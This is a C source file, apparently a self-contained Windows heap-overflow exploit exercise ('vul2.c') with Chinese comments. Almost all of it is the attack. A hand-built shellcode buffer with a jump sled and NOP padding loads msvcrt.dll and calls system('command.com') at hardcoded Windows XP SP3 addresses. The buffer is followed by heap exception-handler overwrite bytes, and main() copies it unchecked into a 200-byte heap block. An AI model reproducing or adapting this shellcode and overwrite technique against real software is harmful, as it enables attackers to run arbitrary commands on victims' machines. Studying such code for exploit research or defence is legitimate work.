/* 
*  Windows Heap overrun test - vul2.c 
*            
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

char mybuf[240] = 
"\xeb\x06"
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"
"\xeb\x06\xeb\x06\xeb\x06\xeb\x06\xeb\x06"

"\x90\x90\x90\x90\x90\x90\x90\x90\x90"			//101 bytes

"\x55\x8B\xEC\x33\xC0\x50\x50\x50\xC6\x45\xF4\x4D\xC6\x45\xF5\x53"
"\xC6\x45\xF6\x56\xC6\x45\xF7\x43\xC6\x45\xF8\x52\xC6\x45\xF9\x54\xC6\x45\xFA\x2E\xC6"
"\x45\xFB\x44\xC6\x45\xFC\x4C\xC6\x45\xFD\x4C\xBA"
"\xFB\x68\xE6\x77"		//sp3 loadlibrary地址0x77e69f64
"\x52\x8D\x45\xF4\x50"	
"\xFF\x55\xF0"
"\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D\x89\x45\xF4\xB8\x61\x6E\x64\x2E" 
"\x89\x45\xF8\xB8\x63\x6F\x6D\x22\x89\x45\xFC\x33\xD2\x88\x55\xFF\x8D\x45\xF4" 
"\x50\xB8"
"\xBF\x8E\x01\x78"		//sp3 system地址0x7801afc3
"\xFF\xD0"										//+107 bytes = 208bytes

//--208- shellcode地址－－异常处理地址
//"\x40\x60\x40\xFF\x4c\x04\xec\x77"
"\x40\x70\x40\xFF\x4c\x04\xec\x77";

int main (int argc, char *argv[])
{
	HANDLE hHeap;
	char *buf1, *buf2;

	hHeap=HeapCreate(HEAP_GENERATE_EXCEPTIONS, 0x10000, 0xfffff);
	printf("mybuf addr = %p\n",mybuf);
	buf1 = HeapAlloc(hHeap, 0, 200);
	strcpy(buf1,mybuf);
		
	buf1[211] = 0x0;		//该为shellcode地址 0x00406030 写成 0x00406040 

	printf("buf1 = %s \n",buf1);
	
	buf2 = HeapAlloc(hHeap, 0, 16);
	
	HeapFree(hHeap, 0, buf1);
	HeapFree(hHeap, 0, buf2);
	getch();
	return 0;
}